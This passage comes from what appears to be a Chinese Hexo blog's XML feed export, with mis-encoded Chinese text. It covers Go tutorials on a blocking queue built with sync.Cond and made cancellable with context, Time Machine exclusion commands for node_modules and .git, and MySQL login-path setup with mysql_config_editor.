<span class="keyword">return</span> q.Size() &gt;= q.capacity</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> isEmpty() <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> q.Size() == <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> Pop() (ele <span class="keyword">interface</span>&#123;&#125;) &#123;</span><br><span class="line">    q.notEmptyCond.L.Lock()</span><br><span class="line">    <span class="keyword">defer</span> q.notEmptyCond.L.Unlock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> q.isEmpty() &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœé˜Ÿåˆ—æ˜¯ç©ºçš„ï¼Œå°±åœ¨ `notEmptyCond` æ¡ä»¶ä¸Šç­‰å¾… </span></span><br><span class="line">        <span class="comment">// Wait å†…éƒ¨ä¼šå…ˆé‡Šæ”¾é”ï¼Œç­‰åˆ°æ”¶åˆ°æ»¡è¶³ä¿¡å·æ—¶å°†é‡æ–°å°è¯•è·å¾—é”</span></span><br><span class="line">        q.notEmptyCond.Wait()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ele = q.elements[q.Size()<span class="number">-1</span>]</span><br><span class="line">    q.elements = q.elements[:q.Size()<span class="number">-1</span>]</span><br><span class="line">    <span class="comment">// æ­¤æ—¶é˜Ÿåˆ—ä¸­å·²ç» Pop ä¸€ä¸ªå€¼ï¼Œä¸å†æ»¡ã€‚å‘é€`notFullCond`ä¿¡å·æ¿€æ´»å†æ­¤æ¡ä»¶ `Wait` çš„æ“ä½œ</span></span><br><span class="line">    q.notFullCond.Signal()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> Add(ele <span class="keyword">interface</span>&#123;&#125;) (err <span class="type">error</span>) &#123;</span><br><span class="line">    q.notEmptyCond.L.Lock()</span><br><span class="line">    <span class="keyword">defer</span> q.notEmptyCond.L.Unlock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> q.isFull() &#123;</span><br><span class="line">       q.notFullCond.Wait()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    q.elements = <span class="built_in">append</span>(q.elements, ele)</span><br><span class="line">    <span class="comment">// æ­¤æ—¶é˜Ÿåˆ—ä¸­å·²ç»æœ‰å€¼ï¼Œå‘é€é˜Ÿåˆ—ä¸ä¸ºç©ºçš„ä¿¡å·æ¿€æ´»å†æ­¤æ¡ä»¶ `Wait` çš„æ“ä½œ</span></span><br><span class="line">    q.notEmptyCond.Signal()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewQueue</span><span class="params">(capacity <span class="type">int</span>)</span></span> *Queue &#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨åŒä¸€æŠŠé”</span></span><br><span class="line">    <span class="keyword">var</span> lock sync.Mutex</span><br><span class="line">    notEmptyCond := sync.NewCond(&amp;lock)</span><br><span class="line">    notFullCond := sync.NewCond(&amp;lock)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &amp;Queue&#123;</span><br><span class="line">        elements: <span class="built_in">make</span>([]<span class="keyword">interface</span>&#123;&#125;, <span class="number">0</span>, capacity),</span><br><span class="line">        capacity: capacity,</span><br><span class="line"></span><br><span class="line">        notEmptyCond: notEmptyCond,</span><br><span class="line">        notFullCond:  notFullCond,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Cond.Wait()</code>åœ¨æ²¡æœ‰æ”¶åˆ°æ¡ä»¶æ»¡è¶³ä¿¡å·æ—¶ä¼šä¸€ç›´é˜»å¡ï¼Œæœ‰æ—¶ä¼šå‡ºç°çˆ¶<code>goroutine</code>å¼‚å¸¸é€€å‡ºæ—¶å­<code>goroutine</code>è¿˜åœ¨ç­‰å¾…çš„æƒ…å†µã€‚æ¯”å¦‚ä¸‹é¢çš„ä¾‹å­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestQueue_Add</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    queue := NewQueue(<span class="number">10</span>)</span><br><span class="line">     <span class="comment">// ç³»ç»Ÿå½“å‰`goroutine`æ•°é‡</span></span><br><span class="line">    expectedNumGoroutine := runtime.NumGoroutine()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ–°èµ·ä¸€ä¸ªåç¨‹ `Pop`ï¼Œç”±äºé˜Ÿåˆ—æ­¤æ—¶ä¸ºç©ºã€‚`Pop` æ“ä½œæ°¸è¿œä¸ä¼šè¿”å›</span></span><br><span class="line">    <span class="comment">// chanelè¦æœ‰ç¼“å†²åŒºï¼Œå¦‚æœçˆ¶`goroutine`æå‰é€€å‡ºï¼Œchanelæ— æ¥æ”¶è€…æ—¶ã€‚done &lt;- ele ä¼šé˜»å¡ï¼Œæ­¤`goroutine`å°†ä¸èƒ½é€€å‡ºï¼Œé€ æˆ goroutine leakã€‚</span></span><br><span class="line">    done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">interface</span>&#123;&#125;, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœçˆ¶`goroutine`æ­¤æ—¶å·²ç»é€€å‡ºï¼Œè¿™æ—¶`Pop`å‡ºæ¥çš„æ¶ˆæ¯å°†ä¸¢å¤±</span></span><br><span class="line">        ele, _ := queue.Pop()</span><br><span class="line">        done &lt;- ele</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-time.After(<span class="number">100</span> * time.Millisecond):</span><br><span class="line">        <span class="comment">// parent goroutine exit</span></span><br><span class="line">        <span class="comment">// ç”±äºPopæ“ä½œæ­¤æ—¶è¿˜æ²¡è¿”å›ï¼Œå®é™…åç¨‹æ•°é‡+1</span></span><br><span class="line">        assert.Equal(t, expectedNumGoroutine+<span class="number">1</span>, runtime.NumGoroutine())</span><br><span class="line">    <span class="keyword">case</span> &lt;-done:</span><br><span class="line">        assert.Equal(t, expectedNumGoroutine, runtime.NumGoroutine())</span><br><span class="line">    &#125;</span><br><span class="line">    queue.Add(<span class="number">1</span>)</span><br><span class="line">    time.Sleep(time.Millisecond)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿™æ¡æ¶ˆæ¯å¯èƒ½ä¼šåœ¨çˆ¶`goroutine`é€€å‡ºåæ‰è¿”å›</span></span><br><span class="line">    assert.Equal(t, <span class="number">1</span>, &lt;-done)</span><br><span class="line">    assert.Equal(t, <span class="number">0</span>, queue.Size())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦è§£å†³ä¸Šé¢é—®é¢˜ï¼Œæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨æ¥<code>Context</code>æ¥å–æ¶ˆå­<code>goroutine</code>ã€‚ä¸‹é¢æ˜¯å®Œæ•´çš„ä¾‹å­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;context&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;github.com/pkg/errors&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// waitWithCancel å¯å–æ¶ˆçš„ Wait</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">waitWithCancel</span><span class="params">(ctx context.Context, cond *sync.Cond)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ctx.Done() != <span class="literal">nil</span> &#123;</span><br><span class="line">        done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            cond.Wait()</span><br><span class="line">            <span class="built_in">close</span>(done)</span><br><span class="line">        &#125;()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">            <span class="keyword">return</span> errors.Wrap(ctx.Err(), <span class="string">&quot;cancel wait&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> &lt;-done:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cond.Wait()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Queue <span class="keyword">struct</span> &#123;</span><br><span class="line">    elements []<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">    capacity <span class="type">int</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// é˜Ÿåˆ—æœªç©ºæ¡ä»¶é˜Ÿåˆ—</span></span><br><span class="line">    notEmptyCond *sync.Cond</span><br><span class="line">    <span class="comment">// é˜Ÿåˆ—æœªæ»¡æ¡ä»¶é˜Ÿåˆ—</span></span><br><span class="line">    notFullCond *sync.Cond</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> Size() <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(q.elements)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> isFull() <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> q.Size() &gt;= q.capacity</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> isEmpty() <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> q.Size() == <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Pop</span></span><br><span class="line"><span class="comment">// å¯ä»¥ä½¿ç”¨ `Context` æ¥ç»ˆæ­¢ Wait é˜»å¡</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> Pop(ctx context.Context) (ele <span class="keyword">interface</span>&#123;&#125;, err <span class="type">error</span>) &#123;</span><br><span class="line">    q.notEmptyCond.L.Lock()</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="comment">// Wait å†…éƒ¨å·²ç»é‡Šæ”¾äº†é”ï¼Œé¿å… `unlock of unlocked mutex` é”™è¯¯</span></span><br><span class="line">        <span class="keyword">if</span> originalErr := errors.Cause(err);</span><br><span class="line">            originalErr != context.DeadlineExceeded &amp;&amp; originalErr != context.Canceled &#123;</span><br><span class="line">            q.notEmptyCond.L.Unlock()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> q.isEmpty() &#123;</span><br><span class="line">        err = waitWithCancel(ctx, q.notEmptyCond)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ele = q.elements[q.Size()<span class="number">-1</span>]</span><br><span class="line">    q.elements = q.elements[:q.Size()<span class="number">-1</span>]</span><br><span class="line">    <span class="comment">// æ­¤æ—¶é˜Ÿåˆ—ä¸­å·²ç» Pop ä¸€ä¸ªå€¼ï¼Œä¸å†æ»¡ã€‚å‘é€é˜Ÿåˆ—ä¸ä¸ºæ»¡çš„ä¿¡å·æ¿€æ´»å†æ­¤æ¡ä»¶ `Wait` çš„æ“ä½œ</span></span><br><span class="line">    q.notFullCond.Signal()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add</span></span><br><span class="line"><span class="comment">// å¯ä»¥ä½¿ç”¨ `Context` æ¥ç»ˆæ­¢ Wait é˜»å¡</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> Add(ctx context.Context, ele <span class="keyword">interface</span>&#123;&#125;) (err <span class="type">error</span>) &#123;</span><br><span class="line">    q.notEmptyCond.L.Lock()</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">       <span class="comment">// Wait å†…éƒ¨å·²ç»é‡Šæ”¾äº†é”ï¼Œé¿å… `unlock of unlocked mutex` é”™è¯¯</span></span><br><span class="line">       <span class="keyword">if</span> originalErr := errors.Cause(err);</span><br><span class="line">           originalErr != context.DeadlineExceeded &amp;&amp; originalErr != context.Canceled &#123;</span><br><span class="line">           q.notEmptyCond.L.Unlock()</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> q.isFull() &#123;</span><br><span class="line">       err = waitWithCancel(ctx, q.notFullCond)</span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">           <span class="keyword">return</span></span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    q.elements = <span class="built_in">append</span>(q.elements, ele)</span><br><span class="line">    <span class="comment">// æ­¤æ—¶é˜Ÿåˆ—ä¸­å·²ç»æœ‰å€¼ï¼Œå‘é€é˜Ÿåˆ—ä¸ä¸ºç©ºçš„ä¿¡å·æ¿€æ´»å†æ­¤æ¡ä»¶ `Wait` çš„æ“ä½œ</span></span><br><span class="line">    q.notEmptyCond.Signal()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewQueue</span><span class="params">(capacity <span class="type">int</span>)</span></span> *Queue &#123;</span><br><span class="line">    <span class="keyword">var</span> lock sync.Mutex</span><br><span class="line">    notEmptyCond := sync.NewCond(&amp;lock)</span><br><span class="line">    notFullCond := sync.NewCond(&amp;lock)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &amp;Queue&#123;</span><br><span class="line">        elements: <span class="built_in">make</span>([]<span class="keyword">interface</span>&#123;&#125;, <span class="number">0</span>, capacity),</span><br><span class="line">        capacity: capacity,</span><br><span class="line"></span><br><span class="line">        notEmptyCond: notEmptyCond,</span><br><span class="line">        notFullCond:  notFullCond,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestQueue_Add</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    queue := NewQueue(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 100æ¯«ç§’ç§’åè¶…æ—¶å–æ¶ˆ</span></span><br><span class="line">    ctx, cancel := context.WithTimeout(context.Background(), <span class="number">100</span> * time.Millisecond)</span><br><span class="line">    <span class="keyword">defer</span> cancel()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        _, err := queue.Pop(ctx)</span><br><span class="line">        <span class="comment">// è¶…æ—¶å–æ¶ˆ</span></span><br><span class="line">        assert.Equal(t, context.DeadlineExceeded, errors.Cause(err))</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å»¶è¿Ÿç›´åˆ°`Pop`è¶…æ—¶å–æ¶ˆ</span></span><br><span class="line">    time.Sleep(<span class="number">200</span> * time.Millisecond)</span><br><span class="line">    queue.Add(context.Background(), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    assert.Equal(t, <span class="number">1</span>, queue.Size())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://kekek.cc/post/java.util.concurrent.html#%E5%86%85%E7%BD%AE%E6%9D%A1%E4%BB%B6%E9%98%9F%E5%88%97">Javaå¹¶å‘ç¼–ç¨‹ å†…ç½®æ¡ä»¶é˜Ÿåˆ—</a></li><li><a href="https://draveness.me/golang/docs/part3-runtime/ch06-concurrency/golang-context/">Go è¯­è¨€è®¾è®¡ä¸å®ç° 6.1 ä¸Šä¸‹æ–‡ Context</a></li><li><a href="https://draveness.me/golang/docs/part3-runtime/ch06-concurrency/golang-sync-primitives/">Go è¯­è¨€è®¾è®¡ä¸å®ç° 6.2 åŒæ­¥åŸè¯­ä¸é”</a></li><li><a href="https://medium.com/codex/implmenting-timeout-in-golang-ee2bc4aa6ae4">Implementing Timeout in Golang</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> queue </tag>
            
            <tag> golang </tag>
            
            <tag> å¹¶å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>timemachine-exclusion</title>
      <link href="/post/timemachine-exclusion.html"/>
      <url>/post/timemachine-exclusion.html</url>
      
        <content type="html"><![CDATA[<h2 id="Time-Machine-æ‰¹é‡æ’é™¤æ–‡ä»¶"><a href="#Time-Machine-æ‰¹é‡æ’é™¤æ–‡ä»¶" class="headerlink" title="Time Machine æ‰¹é‡æ’é™¤æ–‡ä»¶"></a>Time Machine æ‰¹é‡æ’é™¤æ–‡ä»¶</h2><ol><li><p>æ‰¹é‡æ’é™¤æ–‡ä»¶</p><p> timemachine ä¸æ”¯æŒé€šé…ç¬¦åŒ¹é…æ’é™¤ï¼Œéœ€è¦æ·»åŠ å¤šæ¡è§„åˆ™æ¥æ’é™¤ã€‚</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ’é™¤æ‰€æœ‰çš„ `node_modules` æ–‡ä»¶å¤¹</span></span><br><span class="line">find . -maxdepth 3 -<span class="built_in">type</span> d -name <span class="string">&#x27;node_modules&#x27;</span> | xargs -n 1 tmutil addexclusion</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ’é™¤æ‰€æœ‰çš„ `.git` ç›®å½•</span></span><br><span class="line">find . -maxdepth 3 -<span class="built_in">type</span> d -name <span class="string">&#x27;.git&#x27;</span> | xargs -n 1 tmutil addexclusion</span><br></pre></td></tr></table></figure></li><li><p>æ£€æŸ¥æ–‡ä»¶æ˜¯å¦è¢«æ’é™¤ </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec tmutil isexcluded &#123;&#125; + | grep -F &quot;[Excluded]&quot; | sed -E &#x27;s/^\[Excluded\][[:space:]]*//&#x27;</span><br></pre></td></tr></table></figure></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ol><li><a href="https://gist.github.com/peterdemartini/4c918635208943e7a042ff5ffa789fc1">Exclude node_modules in timemachine</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql-login-path</title>
      <link href="/post/mysql-login-path.html"/>
      <url>/post/mysql-login-path.html</url>
      
        <content type="html"><![CDATA[<h2 id="login-path"><a href="#login-path" class="headerlink" title="login-path"></a>login-path</h2><p><code>login-path</code> é€‰é¡¹èƒ½å®ç°å¿«æ·ç™»å½•MySQLæœåŠ¡å™¨ï¼Œæˆ‘ä»¬ä¸éœ€è¦æ¯æ¬¡éƒ½è¾“å…¥ç”¨æˆ·åã€hostã€å¯†ç ç­‰ç™»å½•è®¤è¯ä¿¡æ¯ï¼Œæ˜¯ä¸€ç§å³å®‰å…¨åˆéå†çš„æ–¹æ³•ã€‚</p><p>ä½¿ç”¨ <code>mysql_config_editor</code> å·¥å…·å°†ç™»å½•MySQLæœåŠ¡çš„è®¤è¯ä¿¡æ¯åŠ å¯†ä¿å­˜åœ¨ <code>.mylogin.cnf</code> æ–‡ä»¶ï¼ˆé»˜è®¤ä½äºç”¨æˆ·ä¸»ç›®å½•ï¼‰ã€‚ä¹‹å MySQL å®¢æˆ·ç«¯å·¥å…·å¯é€šè¿‡è¯»å–è¯¥åŠ å¯†æ–‡ä»¶è¿æ¥ MySQLï¼Œé¿å…é‡å¤è¾“å…¥ç™»å½•ä¿¡æ¯å’Œæ•æ„Ÿä¿¡æ¯æš´éœ²ã€‚</p><h3 id="é…ç½®-login-path"><a href="#é…ç½®-login-path" class="headerlink" title="é…ç½® login-path"></a>é…ç½® login-path</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_config_editor <span class="built_in">set</span> --login-path=dev --user=dev --host=172.26.8.143 --password</span><br></pre></td></tr></table></figure><p>å¯ä»¥é…ç½®å¤šä¸ªç™»å½•ä¿¡æ¯ã€‚<code>login-path</code>å¯ä»¥çœ‹åšç™»å½•ä¿¡æ¯çš„åˆ«åï¼Œæ–¹ä¾¿ä½¿ç”¨æ—¶å¼•ç”¨ã€‚æ›´è¯¦ç»†çš„é…ç½®ä¿¡æ¯æŸ¥çœ‹ <code>mysql_config_editor set --help</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_config_editor <span class="built_in">set</span> --login-path=<span class="built_in">test</span> --user=<span class="built_in">test</span> --host=172.26.8.144 --password</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆé…ç½®äº†ä¸€ä¸ª <code>login-path</code> ä¸º <code>test</code> çš„ç™»å½•ä¿¡æ¯ã€‚</p><h3 id="æŸ¥çœ‹é…ç½®è¿‡çš„ç™»å½•ä¿¡æ¯"><a href="#æŸ¥çœ‹é…ç½®è¿‡çš„ç™»å½•ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹é…ç½®è¿‡çš„ç™»å½•ä¿¡æ¯"></a>æŸ¥çœ‹é…ç½®è¿‡çš„ç™»å½•ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_config_editor print --all</span><br></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[dev]</span></span><br><span class="line"><span class="attr">user</span> = dev</span><br><span class="line"><span class="attr">password</span> = *****</span><br><span class="line"><span class="attr">host</span> = <span class="number">172.26</span>.<span class="number">8.143</span></span><br><span class="line"><span class="section">[test]</span></span><br><span class="line"><span class="attr">user</span> = test</span><br><span class="line"><span class="attr">password</span> = *****</span><br><span class="line"><span class="attr">host</span> = <span class="number">172.26</span>.<span class="number">8.144</span></span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨-login-path-ç™»å½•"><a href="#ä½¿ç”¨-login-path-ç™»å½•" class="headerlink" title="ä½¿ç”¨ login-path ç™»å½•"></a>ä½¿ç”¨ <code>login-path</code> ç™»å½•</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql --login-path=dev</span><br></pre></td></tr></table></figure><h3 id="åˆ é™¤-login-path"><a href="#åˆ é™¤-login-path" class="headerlink" title="åˆ é™¤ login-path"></a>åˆ é™¤ <code>login-path</code></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_config_editor remove --login-path=dev</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://www.cnblogs.com/David-domain/p/11176474.html">MySQL login-path æœ¬åœ°å¿«æ·ç™»å½•</a></li><li><a href="https://dev.mysql.com/doc/refman/5.7/en/mysql-config-editor.html">MySQL Configuration Utility</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>system-time</title>
      <link href="/post/system-time.html"/>
      <url>/post/system-time.html</url>
      
